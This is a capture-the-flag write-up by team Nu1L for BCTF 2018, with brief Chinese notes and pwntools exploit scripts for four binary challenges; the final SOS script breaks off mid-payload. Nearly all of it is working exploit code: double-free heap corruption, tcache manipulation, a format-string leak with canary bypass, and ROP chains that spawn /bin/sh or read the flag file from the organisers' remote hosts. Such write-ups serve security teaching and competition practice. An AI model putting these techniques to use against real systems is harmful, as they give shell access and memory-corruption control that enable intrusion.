# BCTF 2018
`By Nu1L`
[TOC]
比赛网址：  
比赛时间：11月27日 14:00 - 11月29日 02:00  
Team-Page：
## PWN
### easiest
Double Free，测了一下远程，不是tcache  
没有Leak  
有一个后门函数  
用GOT表里面的0x40做size
    from pwn import *
    #p = process('./easiest')
    p = remote('39.96.9.148', 9999)
    def add(idx, size, c):
        p.recv()
        p.sendline('1')
        p.recvuntil('(0-11):')
        p.sendline(str(idx))
        p.recvuntil('Length:')
        p.sendline(str(size))
        p.recvuntil('C:')
        p.sendline(c)
    def dele(idx):
        p.recv()
        p.sendline('2')
        p.recvuntil('(0-11):')
        p.sendline(str(idx))
    add(0, 0x38, 'aaa')
    add(1, 0x38, 'bbb')
    dele(0)
    dele(1)
    dele(0)
    add(2, 0x38, p64(0x60203a))
    add(3, 0x38, p64(0x60203a))
    add(4, 0x38, p64(0x60203a))
    add(5, 0x38, '\x40\x00\x00\x00\x00\x00' + p64(0x400946) * 5)
    p.interactive()
### three
    from pwn import *
    def add(cont):
        p.recvuntil('choice')
        p.sendline('1')
        p.recvuntil('content:')
        p.send(cont)
    def edit(idx,cont):
        p.recvuntil('choice')
        p.sendline('2')
        p.recvuntil('idx')
        p.sendline(str(idx))
        p.recvuntil('content:')
        p.send(cont)
    def dele(idx,cl = 'n'):
        p.recvuntil('choice')
        p.sendline('3')
        p.recvuntil('idx')
        p.sendline(str(idx))
        p.recvuntil('):')
        p.sendline(cl)
    while True:
        try:
            p=remote('39.96.13.122', 9999)
            #p=process('./three')#,env={'LD_PRELOAD':'./libc.so.6'})        
            add('\n')
            add('\n')
            add((p64(0xc0)+p64(0x21))*4)
            dele(2,'y')
            dele(1,'y')
            dele(0)
            edit(0,'\x70')
            add('\x70')
            add('\n')
            edit(0,p64(0)+p64(0x91))
            dele(1,'y')
            dele(2)
            dele(2)
            dele(2)
            dele(2)
            dele(2)
            dele(2)
            dele(2)
            edit(0,p64(0)+p64(0x51))
            dele(2)
            edit(0,p64(0)+p64(0x91))
            dele(2,'y')
            x = 0xa8#int(raw_input(),16)#
            edit(0,p64(0)+p64(0x51)+'\xe8'+chr(x))
            add('\xe8'+chr(x))
            #add(p64(0xffffffffff600400))
            add(p64(0))
            dele(1)
            dele(1,'y')
            edit(0,p64(0)+p64(0x51)+'\x78')
            edit(2,p64(0xffffffffff600400))
            add('\x78')
            dele(1,'y')
            add('\xd8'+chr(x))
            dele(0,'y')
            add('\x40')
            dele(0,'y')
            add('\n')
            dele(0,'y')
            add('/bin/sh\x00')
            a =0xa9#int(raw_input(),16)
            b =0x26#int(raw_input(),16)
            c =0x94# int(raw_input(),16)        
            edit(2,chr(a)+chr(b)+chr(c))
            p.recvuntil('choice')
            p.sendline('3')
            re = p.recvuntil('idx',timeout=0.8)
            if re[-1:] != 'x':
                continue
            p.sendline('0')
            p.sendline('cat flag;bash')
            re = p.recvuntil('(y/n)',timeout = 0.8)
            if re:
                print re
                continue
            p.sendline('echo 123;cat flag') 
            p.interactive()
        except:
            p.close()
            continue
`BCTF{U_4r3_Ready_For_House_OF_ATUM}`
### hardcore_fmt
    #coding=utf8
    from pwn import *
    context.arch = 'amd64'
    context.log_level = 'debug'
    context.aslr = False
    def pwn(p):
        p.recvuntil('Welcome to hard-core fmt\n')
        p.sendline('%a'*5)
        p.recvuntil('0x0p+00x0.0000000000001p-10220x0.0')
        addr1 = int(p.recvuntil('p-10220x0.0', drop=True) + '00', 16) - 0x100 - 0x1000
        log.success('addr1: {}'.format(hex(addr1)))
        addr2 = int(p.recvuntil('p-10220x0.0', drop=True) + '00', 16) - 0x1500
        log.success('addr2: {}'.format(hex(addr2)))
        p.sendline(str(addr2 + 0x14c0 + 0x68 + 1))
        p.recvuntil(': ')
        # 下一次gets会把数据读取到stack_addr中
        libc_base = addr1 - 0x619000
        ld_base = addr1 - 0x228000
        log.success('libc_base: {}'.format(hex(libc_base)))
        log.success('ld_base: {}'.format(hex(ld_base)))
        mem_addr = libc_base + 0x3EB0A8 # strlen
        mem_addr = libc_base + 0x3EB140 # memcpy
        canary = '\x00' + p.recv(7)
        log.success('cnaary: {}'.format(hex(u64(canary))))
        payload = 'a'*0x108 + canary + 'b'*0x8  + p64(mem_addr) + 'c'*0x8 + p64(0xffffffffff600000) * 7
        p.sendline(payload)
        # leak program
        p.sendline(str(addr1 + 0x30 + 0x1000))
        p.recvuntil(': ')
        program_base = u64(p.recv(6) + '\x00\x00') - 0x238
        log.success('program_base: {}'.format(hex(program_base)))
        payload = p64(program_base + 0x970) # start
        p.sendline(payload)
        # 第二次
        p.recvuntil('Welcome to hard-core fmt\n')
        p.sendline('hahaha')
        p.recvuntil('hahaha')
        p.sendline(str(addr2))
        p.recvuntil(': ')
        # 0x000000000002155f : pop rdi ; ret
        payload = 'a'*0x108 + canary + 'b'*0x8  + p64(mem_addr) + 'c'*0x8
        payload += p64(libc_base + 0x21560) # 栈对齐
        payload += p64(libc_base + 0x000000000002155f) + p64(libc_base + 0x1B3E9A)
        payload += p64(libc_base + 0x4F440)
        #gdb.attach(p)
        p.sendline(payload)
        p.interactive()
    if __name__ == '__main__':
        p = process('./hardcore_fmt')
        p = remote('39.106.110.69', 9999)
        pwn(p)
### SOS
    from pwn import *
    #p = process('./SOS', env = {'LD_PRELOAD': './libc-2.27.so'})
    p = remote('39.96.8.50', 9999)
    p.recvuntil('Give me the string size:')
    p.sendline('0')
    p.recvuntil('Alright, input your SOS code:')
    payload = '\x00' * 56
    payload += p64(0x400c53)
    payload += p64(0x602020)
    payload += p64(0x4008E0)
    payload += p64(0x400AFC)
    #raw_input()
    p.send(payload + '\x00' * 8192)
    p.recvline()
    puts = p.recvline().strip()
    puts_addr = u64(puts.ljust(8, '\x00'))
    libc_addr = puts_addr - 0x809c0
    print hex(puts_addr)
    print hex(libc_addr)
    system_addr = libc_addr + 0x4f440
    binsh_addr = libc_addr + 0x1b3e9a
    mov_qword_ptr_rsi_rdi = libc_addr + 0x1401fd
    poprsi = libc_addr + 0x23e6a
    poprdi = libc_addr + 0x2155f
    poprdx = libc_addr + 0x01b96
    open_addr = libc_addr + 0x10fc40
    read_addr = 0x400900
    write_addr = libc_addr + 0x110140
    payload = '\x00' * 56
    payload += p64(poprdi)
    payload += "flag\x00\x00\x00\x00"
    payload += p64(poprsi)
    payload += p64(0x602080)
    payload += p64(mov_qword_ptr_rsi_rdi)
    payload += p64(poprdi)
    payload += p64(0x602080)
    payload += p64(poprsi)
    payload += p64(0)
    payload += p64(open_addr)
    payload += p64(poprdi)
    payload += p64(3)
    payload += p64(poprsi)
    payload += p64(0x602080)
    payload += p64(poprdx)
    payload += p64(100)
    payload += p64(read_addr)
    payload += p64(poprdi)
    payload += p64(1)
    payload += p64(poprsi)
    payload += p64(0x602080)
    payload += p64(write_addr)
    #raw_input()
    p.recvuntil('Alright, input your SOS code:')